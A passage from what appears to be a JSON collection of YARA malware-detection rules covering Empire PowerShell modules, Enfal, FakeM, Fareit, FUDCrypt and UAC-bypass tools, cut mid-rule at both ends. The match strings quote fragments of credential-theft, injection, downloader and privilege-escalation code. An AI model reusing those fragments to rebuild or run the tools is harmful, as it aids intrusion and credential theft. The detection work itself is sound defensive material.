f8 } /* Opcode */\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )\n}\n\nrule sig_5783b35b2eace55a5762df27fcb0b0fb28371b3e {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file 5783b35b2eace55a5762df27fcb0b0fb28371b3e.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"72513534f2e0f3e77a22023b887df3718c9df70686eb0ae58cbbde2f90f447e4\"\n\tstrings:\n\t\t$s1 = \"B+P:\\\\6\" fullword ascii\n\t\t$s2 = \"6.666K6S6d6l6}6\" fullword ascii\n\t\t$s3 = \"0!0&0+0<0A0F0W0\\\\0a0n0z0\" fullword ascii\n\t\t$s4 = \";#;);.;:;@;E;Q;W;\\\\;h;q;v;\" fullword ascii\n\t\t$s5 = \"2#2-222F2L2W2\\\\2b2g2x2~2\" fullword ascii\n\t\t$s6 = \"9\\\"9)90979>9E9L9S9Z9k9}",
  "Empire_PowerShell_Framework_Gen3": "rule Empire_PowerShell_Framework_Gen3 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash3 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash4 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"if (($PEInfo.FileType -ieq \\\"DLL\\\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\" fullword ascii\n      $s2 = \"remote DLL injection\" ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_InveighRelay_Gen": "rule Empire_Invoke_InveighRelay_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41\"\n   strings:\n      $s1 = \"$inveigh.SMBRelay_failed_list.Add(\\\"$HTTP_NTLM_domain_string\\\\$HTTP_NTLM_user_string $SMBRelayTarget\\\")\" fullword ascii\n      $s2 = \"$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 200KB and 1 of them ) or all of them\n}",
  "Empire_KeePassConfig_Gen": "rule Empire_KeePassConfig_Gen {\n   meta:\n      description = \"Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3\"\n   strings:\n      $s1 = \"$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_Portscan_Gen": "rule Empire_Invoke_Portscan_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash2 = \"cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3\"\n   strings:\n      $s1 = \"Test-Port -h $h -p $Port -timeout $Timeout\" fullword ascii\n      $s2 = \"1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 100KB and 1 of them ) or all of them\n}",
  "Empire_PowerShell_Framework_Gen4": "rule Empire_PowerShell_Framework_Gen4 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-BypassUAC.ps1, Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DllInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PsExec.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"743c51334f17751cfd881be84b56f648edbdaf31f8186de88d094892edc644a9\"\n      hash2 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash3 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash4 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash5 = \"304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0\"\n      hash6 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n      hash7 = \"0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88\"\n      hash8 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash9 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n      hash10 = \"fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438\"\n   strings:\n      $s1 = \"Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }\" fullword ascii\n      $s2 = \"# Get a handle to the module specified\" fullword ascii\n      $s3 = \"$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\" fullword ascii\n      $s4 = \"$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen": "rule Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3\"\n   strings:\n      $s1 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\" fullword ascii\n      $s2 = \"$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them\n}",
  "Empire_Invoke_Gen": "rule Empire_Invoke_Gen {\n   meta:\n      description = \"Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"$Shellcode1 += 0x48\" fullword ascii\n      $s2 = \"$PEHandle = [IntPtr]::Zero\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them\n}",
  "Empire_PowerShell_Framework_Gen5": "rule Empire_PowerShell_Framework_Gen5 {\n   meta:\n      description = \"Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/adaptivethreat/Empire\"\n      date = \"2016-11-05\"\n      super_rule = 1\n      hash1 = \"1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8\"\n      hash2 = \"61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4\"\n      hash3 = \"eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5\"\n   strings:\n      $s1 = \"if ($ExeArgs -ne $null -and $ExeArgs -ne '')\" fullword ascii\n      $s2 = \"$ExeArgs = \\\"ReflectiveExe $ExeArgs\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them\n}",
  "Enfal": "rule Enfal : Family\n{\n    meta:\n        description = \"Enfal\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    condition:\n        EnfalCode or EnfalStrings\n}",
  "Enfal_Malware": "rule Enfal_Malware {\n\tmeta:\n\t\tdescription = \"Detects a certain type of Enfal Malware\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/02/10\"\n\t\thash = \"9639ec9aca4011b2724d8e7ddd13db19913e3e16\"\n\t\tscore = 60\n\tstrings:\n\t\t$s0 = \"POWERPNT.exe\" fullword ascii\n\t\t$s1 = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n\t\t$s2 = \"%HOMEPATH%\" fullword ascii\n\t\t$s3 = \"Server2008\" fullword ascii\n\t\t$s4 = \"Server2003\" fullword ascii\n\t\t$s5 = \"Server2003R2\" fullword ascii\n\t\t$s6 = \"Server2008R2\" fullword ascii\n\t\t$s9 = \"%HOMEDRIVE%\" fullword ascii\n\t\t$s13 = \"%ComSpec%\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Enfal_Malware_Backdoor": "rule Enfal_Malware_Backdoor {\n\tmeta:\n\t\tdescription = \"Generic Rule to detect the Enfal Malware\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015/02/10\"\n\t\tsuper_rule = 1\n\t\thash0 = \"6d484daba3927fc0744b1bbd7981a56ebef95790\"\n\t\thash1 = \"d4071272cc1bf944e3867db299b3f5dce126f82b\"\n\t\thash2 = \"6c7c8b804cc76e2c208c6e3b6453cb134d01fa41\"\n\t\tscore = 60\n\tstrings:\n\t\t$mz = { 4d 5a }\n\t\t\t\n\t\t$x1 = \"Micorsoft Corportation\" fullword wide\n\t\t$x2 = \"IM Monnitor Service\" fullword wide\n\t\t\n\t\t$s1 = \"imemonsvc.dll\" fullword wide\n\t\t$s2 = \"iphlpsvc.tmp\" fullword\n\t\t\n\t\t$z1 = \"urlmon\" fullword\n\t\t$z2 = \"Registered trademarks and service marks are the property of their respec\" wide\t\t\n\t\t$z3 = \"XpsUnregisterServer\" fullword\n\t\t$z4 = \"XpsRegisterServer\" fullword\n\t\t$z5 = \"{53A4988C-F91F-4054-9076-220AC5EC03F3}\" fullword\n\tcondition:\n\t\t( $mz at 0 ) and \n\t\t( \n\t\t\t1 of ($x*) or \n\t\t\t( all of ($s*) and all of ($z*) )\n\t\t)\n}",
  "ce_enfal_cmstar_debug_msg": "rule ce_enfal_cmstar_debug_msg\n{\n    meta:\n        Author      = \"rfalcone\"\n        Date        = \"2015.05.10\"\n        Description = \"Detects the static debug strings within CMSTAR\"\n        Reference   = \"http://researchcenter.paloaltonetworks.com/2015/05/cmstar-downloader-lurid-and-enfals-new-cousin\"\n\n    strings:\n        $d1 = \"EEE\\x0d\\x0a\" fullword\n        $d2 = \"TKE\\x0d\\x0a\" fullword\n        $d3 = \"VPE\\x0d\\x0a\" fullword\n        $d4 = \"VPS\\x0d\\x0a\" fullword\n        $d5 = \"WFSE\\x0d\\x0a\" fullword\n        $d6 = \"WFSS\\x0d\\x0a\" fullword\n        $d7 = \"CM**\\x0d\\x0a\" fullword\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($d*)\n}",
  "Win7Elevatev2": "rule Win7Elevatev2 {\n\tmeta:\n\t\tdescription = \"Detects Win7Elevate - Windows UAC bypass utility\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html\"\n\t\tdate = \"2015-05-14\"\n\t\thash1 = \"4f53ff6a04e46eda92b403faf42219a545c06c29\" /* x64 */\n\t\thash2 = \"808d04c187a524db402c5b2be17ce799d2654bd1\" /* x86 */\n\t\tscore = 60\n\tstrings:\n\t\t$x1 = \"This program attempts to bypass Windows 7's default UAC settings to run \" wide\n\t\t$x2 = \"Win7ElevateV2\\\\x64\\\\Release\\\\\" ascii\n\t\t$x3 = \"Run the command normally (without code injection)\" wide\t\n\t\t$x4 = \"Inject file copy && elevate command\" fullword wide\n\t\t$x5 = \"http://www.pretentiousname.com/misc/win7_uac_whitelist2.html\" fullword wide\n\t\t$x6 = \"For injection, pick any unelevated Windows process with ASLR on:\" fullword wide\n\t\t\n\t\t$s1 = \"\\\\cmd.exe\" wide\n\t\t$s2 = \"runas\" wide\n\t\t$s3 = \"explorer.exe\" wide\n\t\t$s4 = \"Couldn't load kernel32.dll\" wide\n\t\t$s5 = \"CRYPTBASE.dll\" wide\n\t\t$s6 = \"shell32.dll\" wide\n\t\t$s7 = \"ShellExecuteEx\" ascii\n\t\t$s8 = \"COMCTL32.dll\" ascii \n\t\t$s9 = \"ShellExecuteEx\" ascii\n\t\t$s10 = \"HeapAlloc\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( 1 of ($x*) or all of ($s*) )\n}",
  "UACME_Akagi": "rule UACME_Akagi {\n\tmeta:\n\t\tdescription = \"Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/hfiref0x/UACME\"\n\t\tdate = \"2015-05-14\"\n\t\thash1 = \"edd2138bbd9e76c343051c6dc898054607f2040a\"\n\t\thash2 = \"e3a919ccc2e759e618208ededa8a543954d49f8a\"\n\t\tscore = 60\n\tstrings:\n\t\t$x1 = \"UACMe injected, Fubuki at your service.\" wide fullword\n\t\t$x3 = \"%temp%\\\\Hibiki.dll\" fullword wide\n\t\t$x4 = \"[UCM] Cannot write to the target process memory.\" fullword wide\n\t\t\n\t\t$s1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n\t\t$s2 = \"D:(A;;GA;;;WD)\" wide\n\t\t$s3 = \"%systemroot%\\\\system32\\\\sysprep\\\\sysprep.exe\" fullword wide\n\t\t$s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\" fullword wide\n\t\t$s5 = \"Fubuki.dll\" ascii fullword\n\t\t\n\t\t$l1 = \"ntdll.dll\" ascii\n\t\t$l2 = \"Cabinet.dll\" ascii\n\t\t$l3 = \"GetProcessHeap\" ascii\n\t\t$l4 = \"WriteProcessMemory\" ascii\n\t\t$l5 = \"ShellExecuteEx\" ascii\n\tcondition:\n\t\t( 1 of ($x*) ) or ( 3 of ($s*) and all of ($l*) ) \n}",
  "UACElevator": "rule UACElevator {\n\tmeta:\n\t\tdescription = \"UACElevator bypassing UAC - file UACElevator.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/MalwareTech/UACElevator\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"fd29d5a72d7a85b7e9565ed92b4d7a3884defba6\"\n\tstrings:\n\t\t$x1 = \"\\\\UACElevator.pdb\" ascii\n\t\t\n\t\t$s1 = \"%userprofile%\\\\Downloads\\\\dwmapi.dll\" fullword ascii\n\t\t$s2 = \"%windir%\\\\system32\\\\dwmapi.dll\" fullword ascii\n\t\t$s3 = \"Infection module: %s\" fullword ascii\n\t\t$s4 = \"Could not save module to %s\" fullword ascii\n\t\t$s5 = \"%s%s%p%s%ld%s%d%s\" fullword ascii\n\t\t$s6 = \"Stack area around _alloca memory reserved by this function is corrupted\" fullword ascii\n\t\t$s7 = \"Stack around the variable '\" fullword ascii\n\t\t$s8 = \"MSVCR120D.dll\" fullword wide\n\t\t$s9 = \"Address: 0x\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 172KB and \n\t\t\t( $x1 or 8 of ($s*) )\n}",
  "s4u": "rule s4u {\n\tmeta:\n\t\tdescription = \"Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/aurel26/s-4-u-for-windows\"\n\t\tdate = \"2015-06-05\"\n\t\thash = \"cfc18f3d5306df208461459a8e667d89ce44ed77\"\n\t\tscore = 50\n\tstrings:\n\t\t// Specific strings (may change)\n\t\t$x0 = \"s4u.exe Domain\\\\Username [Extra SID]\" fullword ascii \n\t\t$x1 = \"\\\\Release\\\\s4u.pdb\" ascii\n\n\t\t// Less specific strings\n\t\t$s0 = \"CreateProcessAsUser failed (error %u).\" fullword ascii \n\t\t$s1 = \"GetTokenInformation failed (error: %u).\" fullword ascii \n\t\t$s2 = \"LsaLogonUser failed (error 0x%x).\" fullword ascii \n\t\t$s3 = \"LsaLogonUser: OK, LogonId: 0x%x-0x%x\" fullword ascii \n\t\t$s4 = \"LookupPrivilegeValue failed (error: %u).\" fullword ascii \n\t\t$s5 = \"The token does not have the specified privilege (%S).\" fullword ascii \n\t\t$s6 = \"Unable to parse command line.\" fullword ascii \n\t\t$s7 = \"Unable to find logon SID.\" fullword ascii \n\t\t$s8 = \"AdjustTokenPrivileges failed (error: %u).\" fullword ascii\n\t\t$s9 = \"AdjustTokenPrivileges (%S): OK\" fullword ascii \n\t\t\n\t\t// Generic\n\t\t$g1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n\t\t$g2 = \"SeTcbPrivilege\" wide\n\t\t$g3 = \"winsta0\\\\default\" wide\n\t\t$g4 = \".rsrc\"\n\t\t$g5 = \"HeapAlloc\"\n\t\t$g6 = \"GetCurrentProcess\"\n\t\t$g7 = \"HeapFree\"\n\t\t$g8 = \"GetProcessHeap\"\n\t\t$g9 = \"ExpandEnvironmentStrings\"\n\t\t$g10 = \"ConvertStringSidToSid\"\n\t\t$g11 = \"LookupPrivilegeValue\"\n\t\t$g12 = \"AllocateLocallyUniqueId\"\n\t\t$g13 = \"ADVAPI32.dll\"\n\t\t$g14 = \"LsaLookupAuthenticationPackage\"\n\t\t$g15 = \"Secur32.dll\"\n\t\t$g16 = \"MSVCR120.dll\"\t\t\n\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and ( 1 of ($x*) or all of ($s*) or all of ($g*) ) \n}",
  "Ezcob": "rule Ezcob : Family\n{\n    meta:\n        description = \"Ezcob\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-23\"\n        \n    condition:\n        EzcobStrings\n}",
  "ws_f0xy_downloader": "rule ws_f0xy_downloader {\n  meta:\n    description = \"f0xy malware downloader\"\n    author = \"Nick Griffin (Websense)\"\n\n  strings:\n    $mz=\"MZ\"\n    $string1=\"bitsadmin /transfer\"\n    $string2=\"del rm.bat\"\n    $string3=\"av_list=\"\n  \n  condition:\n    ($mz at 0) and (all of ($string*))\n}",
  "rc4_stack_key_fallchill": "rule rc4_stack_key_fallchill\n{\nmeta:\n    description = \"rc4_stack_key\"\n\tref = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\nstrings:\n    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }\ncondition:\n    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key\n}",
  "success_fail_codes_fallchill": "rule success_fail_codes_fallchill\n{\nmeta:\n    description = \"success_fail_codes\"\n\tref = \"https://www.us-cert.gov/ncas/alerts/TA17-318A\"\nstrings:\n    $s0 = { 68 7a 34 12 00 }  \n    $s1 = { ba 7a 34 12 00 }  \n    $f0 = { 68 5c 34 12 00 }  \n    $f1 = { ba 5c 34 12 00 }\ncondition:\n    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))\n}",
  "FUDCrypter": "rule FUDCrypter\n{\n    meta:\n        description = \"Detects unmodified FUDCrypt samples\"\n        reference = \"https://github.com/gigajew/FudCrypt/\"\n        author = \"https://github.com/hwvs\"\n        last_modified = \"2019-11-21\"\n\n    strings:\n        $ = \"OcYjzPUtJkNbLOABqYvNbvhZf\" wide ascii\n        $ = \"gwiXxyIDDtoYzgMSRGMckRbJi\" wide ascii\n        $ = \"BclWgISTcaGjnwrzSCIuKruKm\" wide ascii\n        $ = \"CJyUSiUNrIVbgksjxpAMUkAJJ\" wide ascii\n        $ = \"fAMVdoPUEyHEWdxQIEJPRYbEN\" wide ascii\n        $ = \"CIGQUctdcUPqUjoucmcoffECY\" wide ascii\n        $ = \"wcZfHOgetgAExzSoWFJFQdAyO\" wide ascii\n        $ = \"DqYKDnIoLeZDWYlQWoxZnpfPR\" wide ascii\n        $ = \"MkhMoOHCbGUMqtnRDJKnBYnOj\" wide ascii\n        $ = \"sHEqLMGglkBAOIUfcSAgMvZfs\" wide ascii\n        $ = \"JtZApJhbFAIFxzHLjjyEQvtgd\" wide ascii\n        $ = \"IIQrSWZEMmoQIKGuxxwoTwXka\" wide ascii\n\n    condition:\n        1 of them\n}",
  "FakeM_Generic": "rule FakeM_Generic {\n\tmeta:\n\t\tdescription = \"Detects FakeM malware samples\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/\"\n\t\tdate = \"2016-01-25\"\n\t\tscore = 85\n\t\thash1 = \"631fc66e57acd52284aba2608e6f31ba19e2807367e33d8704f572f6af6bd9c3\"\n\t\thash2 = \"3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520\"\n\t\thash3 = \"53af257a42a8f182e97dcbb8d22227c27d654bea756d7f34a80cc7982b70aa60\"\n\t\thash4 = \"4a4dfffae6fc8be77ac9b2c67da547f0d57ffae59e0687a356f5105fdddc88a3\"\n\t\thash5 = \"7bfbf49aa71b8235a16792ef721b7e4195df11cb75371f651595b37690d108c8\"\n\t\thash6 = \"12dedcdda853da9846014186e6b4a5d6a82ba0cf61d7fa4cbe444a010f682b5d\"\n\t\thash7 = \"9adda3d95535c6cf83a1ba08fe83f718f5c722e06d0caff8eab4a564185971c5\"\n\t\thash8 = \"3209ab95ca7ee7d8c0140f95bdb61a37d69810a7a23d90d63ecc69cc8c51db90\"\n\t\thash9 = \"41948c73b776b673f954f497e09cc469d55f27e7b6e19acb41b77f7e64c50a33\"\n\t\thash10 = \"53cecc0d0f6924eacd23c49d0d95a6381834360fbbe2356778feb8dd396d723e\"\n\t\thash11 = \"523ad50b498bfb5ab688d9b1958c8058f905b634befc65e96f9f947e40893e5b\"\n\tstrings:\n\t\t$a1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n\t\t$a2 = \"\\\\boot.lnk\" fullword ascii\n\t\t$a3 = \"%USERPROFILE%\" fullword ascii /* Goodware String - occured 16 times */\n\n\t\t$b1 = \"Wizard.EXE\" fullword wide\n\t\t$b2 = \"CommandLineA\" fullword ascii\n\n\t\t$c1 = \"\\\\system32\\\\kernel32.dll\" fullword ascii\n\t\t$c2 = \"\\\\aapz.tmp\" fullword ascii\n\n\t\t$e1 = \"C:\\\\Documents and Settings\\\\A\\\\\" fullword ascii\n\t\t$e2 = \"\\\\svchost.exe\" fullword ascii\n\t\t$e3 = \"\\\\Perform\\\\Release\\\\Perform.pdb\" fullword ascii\n\n\t\t$f1 = \"Browser.EXE\" fullword wide\n\t\t$f2 = \"\\\\browser.exe\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and\n\t\t( all of ($a*) or all of ($b*) or all of ($c*) or all of ($e*) or 1 of ($f*) )\n}",
  "Fareit_Trojan_Oct15": "rule Fareit_Trojan_Oct15 {\n\tmeta:\n\t\tdescription = \"Detects Fareit Trojan from Sep/Oct 2015 Wave\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/5VYtlU\"\n\t\tdate = \"2015-10-18\"\n\t\tscore = 80\n\t\tsuper_rule = 1\n\t\thash1 = \"230ca0beba8ae712cfe578d2b8ec9581ce149a62486bef209b04eb11d8c088c3\"\n\t\thash2 = \"3477d6bfd8313d37fedbd3d6ba74681dd7cb59040cabc2991655bdce95a2a997\"\n\t\thash3 = \"408fa0bd4d44de2940605986b554e8dab42f5d28a6a525b4bc41285e37ab488d\"\n\t\thash4 = \"76669cbe6a6aac4aa52dbe9d2e027ba184bf3f0b425f478e8c049637624b5dae\"\n\t\thash5 = \"9486b73eac92497e703615479d52c85cfb772b4ca6c846ef317729910e7c545f\"\n\t\thash6 = \"c3300c648aebac7bf1d90f58ea75660c78604410ca0fa705d3b8ec1e0a45cdd9\"\n\t\thash7 = \"ff83e9fcfdec4ffc748e0095391f84a8064ac958a274b9684a771058c04cb0fa\"\n\tstrings:\n\t\t$s1 = \"ebai.exe\" fullword wide\n\t\t$s2 = \"Origina\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and $s1 in (0..30000) and $s2 in (0..30000)\n}",
  "d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9": "rule d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file d4fe01ea13cf9926c2cf51d0ffbd78f9a110f4b9.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"d1dc9b2905264da34dc97d6c005810fbcc99be1a6b4b41f883bb179dbcacba6e\"\n\tstrings:\n\t\t$s1 = \":&:-:=:J:O:\\\\:m:r:\" fullword ascii\n\t\t$s2 = \"6)6/666;6N6W6^6c6t6y6\" fullword ascii\n\t\t$s3 = \"666Q6V6b6g6~6\" fullword ascii\n\t\t$s4 = \"0%0,010A0F0K0\\\\0a0f0w0|0\" fullword ascii\n\t\t$s5 = \"6!6(63686E6J6W6\\\\6i6n6{6\" fullword ascii\n\t\t$s6 = \"3 3%33383=3J3R3`3e3o3t3~3\" fullword ascii\n\t\t$s7 = \"4 4'40454:4G4M4R4_4e4j4w4\" fullword ascii\n\t\t$s8 = \"1#1(141=1B1N1T1Y1e1k1p1|1\" fullword ascii\n\t\t$s9 = \"?(?2?<?C?J?Q?X?_?f?m?t?{?\" fullword ascii\n\t\t$s10 = \"?#?*?1?8???F?M?T?[?b?i?p?w?\" fullword ascii\n\t\t$s11 = \"6)6/646@6F6K6W6]6b6n6w6|6\" fullword ascii\n\t\t$s12 = \"4#40454:4G4L4Q4^4c4h4u4z4\" fullword ascii\n\t\t$s13 = \"<\\\"<'<3<8<=<I<N<S<_<d<i<u<z<\" fullword ascii\n\t\t$s14 = \">%>/>9>@>G>N>U>\\\\>c>j>q>\" fullword ascii\n\t\t$s15 = \"WTZDAE\" fullword ascii\n\t\t$s16 = \"060>0E0K0P0\\\\0b0g0v0|0\" fullword ascii\n\t\t$s17 = \"4#4-474A4K4U4\\\\4f4p4z4\" fullword ascii\n\t\t$s18 = \"7\\\"7,767@7J7T7^7h7q7{7\" fullword ascii\n\t\t$s19 = \";\\\";';4;E;J;W;k;p;};\" fullword ascii\n\t\t$s20 = \";0;;;F;Q;\\\\;g;r;};\" fullword ascii\n\n\t\t$op0 = { a1 b8 63 44 00 83 c4 14 53 ff 75 14 56 57 ff 90 } /* Opcode */\n\t\t$op1 = { 8b d8 8b 45 08 8b 40 3a 81 c3 00 10 00 00 03 c3 } /* Opcode */\n\t\t$op2 = { 5c 2d 44 00 c7 84 24 c0 } /* Opcode */\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 10 of ($s*) )and 1 of ($op*) ) or ( all of them )\n}\n\nrule sig_7acb8d6d4c062c3097a7d31df103bc4d018519f9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file 7acb8d6d4c062c3097a7d31df103bc4d018519f9.codex\"\n\t\tauthor = \"YarGen Rule Generator\"\n\t\treference = \"not set\"\n\t\tdate = \"2016-07-21\"\n\t\thash1 = \"e1607486cbb2d111d5df314fe58948aa0dc5897f56f7fd763c62bb30651380e3\"\n\tstrings:\n\t\t$s1 = \"5(666Z6c6\" fullword ascii\n\t\t$s2 = \"Wlm;y%UD%d\" fullword ascii\n\t\t$s3 = \";1;9;@;G;N;U;\\\\;c;j;q;x;\" fullword ascii\n\t\t$s4 = \"8 8'8.858<8C8J8Q8X8_8f8m8t8\" fullword ascii\n\t\t$s5 = 